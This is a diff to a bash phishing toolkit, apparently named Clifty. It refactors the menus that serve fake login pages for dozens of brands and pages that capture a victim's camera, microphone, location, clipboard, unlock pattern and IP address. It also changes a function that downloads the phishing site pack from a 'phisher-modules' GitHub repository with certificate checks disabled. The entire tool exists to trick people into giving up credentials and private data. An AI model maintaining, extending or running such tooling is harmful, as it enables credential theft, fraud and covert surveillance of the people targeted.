@@ -208,7 +208,7 @@ directories(){
         if [[ ! -d "${fetch_dir}" ]]; then
                 mkdir "${fetch_dir}"
                 echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created Fetch directory"
-        fi
+        fi     
         if [[ -d "${www_dir}" ]]; then
                 rm -rf "${www_dir}"
                 mkdir -p "${www_dir}"
@@ -404,12 +404,17 @@ status_display(){
 
 homepage() {
 status_display
+if [[ ! -d "${site_dir}" ]]; then
+        d4site="Download"
+else
+        d4site="Delete"
+fi 
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
 echo -e ""
 echo -e "${CYAN} [1]${GREEN} Login          ${NC}""${CYAN} [A]${MAGENTA} About             ${NC}"
 echo -e "${CYAN} [2]${GREEN} Camera         ${NC}""${CYAN} [B]${MAGENTA} Request site      ${NC}"
 echo -e "${CYAN} [3]${GREEN} Microphone     ${NC}""${CYAN} [C]${MAGENTA} Report Issue      ${NC}"
-echo -e "${CYAN} [4]${GREEN} Location       ${NC}""${CYAN} [D]${MAGENTA} Download All sites${NC}"
+echo -e "${CYAN} [4]${GREEN} Location       ${NC}""${CYAN} [D]${MAGENTA} ${d4site} All sites${NC}"
 echo -e "${CYAN} [5]${GREEN} Clipboard      ${NC}""${CYAN} [E]${MAGENTA} Logs              ${NC}"
 echo -e "${CYAN} [6]${GREEN} Pattern        ${NC}""${CYAN} [F]${MAGENTA} Update            ${NC}"
 echo -e "${CYAN} [7]${GREEN} IP address     ${NC}""${CYAN} [G]${MAGENTA} Open Discussions  ${NC}"
@@ -419,25 +424,18 @@ echo -e " "
  read -p "${prompt}" reply_home
 case $reply_home in
         1 )
-                site_access="login"
 		menu_login;;
         2 )
-                site_access="camera"
 		menu_camera;;
         3 )
-                site_access="microphone"
 		menu_microphone;;
         4 )
-                site_access="location"
 		menu_location;;
         5 )
-                site_access="clipboard"
 		menu_clipboard;;
         6 )
-                site_access="pattern"
 		menu_pattern;;
-        7 )
-                site_access="ip_address"
+        7 )  
 		menu_ip;;
 	A | a)
 		xdg-open ${link_clifty}
@@ -449,7 +447,7 @@ case $reply_home in
                 xdg-open ${link_clifty}/issues/new
 		{ sleep 2; clear; banner; homepage; };;
         D | d)
-                download_allsite;;
+                dsites;;
 	E | e)
 		logs_check;;
 	F | f)
@@ -467,10 +465,9 @@ esac
 tunnel_menu
 }
 
-
-
 menu_login() {
 status_display
+site_access="login"
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A SITE${NF} : ${NC} "
 echo -e ""
 echo -e "${CYAN} [1]${MAGENTA} Adobe         ${NC}""${CYAN} [26]${MAGENTA} Mediafire    ${NC}""${CYAN} [51]${MAGENTA} Telenor       ${NC}"
@@ -647,6 +644,7 @@ esac
 }
 menu_camera(){
 status_display
+site_access="camera"
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
 echo -e ""
 echo -e "${CYAN}     IMAGE            ${NC}""${CYAN}     VIDEO             ${NC}"
@@ -768,6 +766,7 @@ esac
 }
 menu_microphone(){
 status_display
+site_access="microphone"
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
 echo -e ""
 echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
@@ -794,6 +793,7 @@ esac
 }
 menu_location(){
 status_display
+site_access="location"
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
 echo -e ""
 echo -e "${CYAN} [1]${MAGENTA} Google Drive   ${NC}"
@@ -844,6 +844,7 @@ esac
 }
 menu_clipboard(){
 status_display
+site_access="clipboard"
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
 echo -e ""
 echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
@@ -870,6 +871,7 @@ esac
 }
 menu_pattern(){
 status_display
+site_access="pattern"
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
 echo -e ""
 echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
@@ -896,6 +898,7 @@ esac
 }
 menu_ip(){
 status_display
+site_access="ip_address"
 echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
 echo -e ""
 echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
@@ -923,33 +926,38 @@ esac
 
 
 ## DOWNLOAD SITES
-download_allsite(){
+dsites(){
         { clear; banner; echo -e ""; }
         status
-	if [ $plainnetstats == "online" ]; then
-               	rm -rf ${sites_dir}
-                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloading Sites..."
-                wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
-                sleep 1
-                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Unzipping Sites..."
-                unzip -q sites.zip
-                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Setting UP..."
-                mv phisher-modules-sites "${pro_dir}/.sites"
-                rm sites.zip
-                if [ -d "${pro_dir}/.sites" ]; then
-                        echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DOWNLOADED SUCCESSFULLY... ${NA}"
+        if [[ ! -d "${site_dir}" ]]; then
+                if [ $plainnetstats == "online" ]; then
+                        rm -rf ${sites_dir}
+                        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloading Sites..."
+                        wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
+                        sleep 1
+                        echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Unzipping Sites..."
+                        unzip -q sites.zip
+                        echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Setting UP..."
+                        mv phisher-modules-sites "${pro_dir}/.sites"
+                        rm sites.zip
+                        if [ -d "${pro_dir}/.sites" ]; then
+                                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DOWNLOADED SUCCESSFULLY... ${NA}"
+                                sleep 3
+                                homepage
+                        else
+                                echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} UNABLE TO DOWNLOAD THE SITES, Try again later... ${NA}"
+                                sleep 5
+                                homepage
+                        fi
+                else
+                        echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} YOUR OFFLINE!! CAN'T DOWNLOAD NOW ${NA}"
                         sleep 3
                         homepage
-                else
-                        echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} UNABLE TO DOWNLOAD THE SITES, Try again later... ${NA}"
-                        sleep 5
-                        homepage
                 fi
-	else
-		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} YOUR OFFLINE!! CAN'T DOWNLOAD NOW ${NA}"
-		sleep 3
-		homepage
-	fi
+        else
+                rm -rf ${site_dir}
+                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DELETED SUCCESSFULLY... ${NA}"
+        fi
 }
 
 #Logs check
@@ -1362,7 +1370,7 @@ cusport() {
 #checking the site is offline or not
 setup_site_check() {
         status_display
-        final_site_dir="${sites_dir}/${site_access}${site_id}"
+        final_site_dir="${sites_dir}/${site_access}/${site_id}"
         if [ -d ${final_site_dir} ]; then
                 if [ -d "${final_site_dir}" ]; then
                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site is already downloaded... NOW STARTING!! " 
@@ -1408,9 +1416,9 @@ setup_site_dgf() {
 	if [ $plainnetstats == "online" ]; then
                 echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
                 if [ "${capture_type}" == "NOTP" ];then
-                        bash ${dgf_dir}/dgf.sh "${dgfurl}" "otp" ""
+                        dgf "${dgfurl}" "otp" ""
                 else
-                        bash ${dgf_dir}/dgf.sh "${dgfurl}" "none" ""
+                        dgf "${dgfurl}" "none" ""
                 fi
 	else
 		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} Your offline can't download the site!!${NA}"
